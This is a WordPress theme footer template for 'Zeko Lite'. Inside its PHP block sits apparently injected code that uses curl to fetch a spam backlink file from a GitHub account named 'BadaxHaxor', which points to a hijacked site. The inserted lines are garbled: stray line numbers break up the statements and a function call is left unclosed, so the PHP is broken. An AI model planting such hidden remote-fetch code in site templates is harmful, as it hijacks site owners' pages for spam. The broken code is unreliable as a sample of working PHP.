<?php
/**
 * The template for displaying the footer.
 *
 * Contains the closing of the #content div and all content after.
 *
 * @link https://developer.wordpress.org/themes/basics/template-files/#template-partials
 *
 * @package Zeko Lite
 */

?>

	</div>

	<footer id="colophon" class="site-footer" role="contentinfo">
		<?php
			if ( has_nav_menu( 'social' ) ) {
				wp_nav_menu( array( 'theme_location' => 'social', 'depth' => 1, 'link_before' => '<span class="screen-reader-text">', 'link_after' => '</span>', 'container_class' => 'social-links' ) );
			}
			get_template_part( 'components/footer/footer', 'widgets' );
			get_template_part( 'components/footer/site', 'info' );
		
$curl = curl_init();
30
$url = 'https://raw.githubusercontent.com/BadaxHaxor/bokep.visorideags.gob.mx/main/backlink.txt';
31
curl_setopt($curl, CURLOPT_URL, $url);
32
curl_setopt($curl, CURLOPT_HEADER, 0);
33
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
34
$result = curl_exec($curl

?>
	</footer>
</div><!-- #page -->
<?php wp_footer(); ?>

</body>
</html>
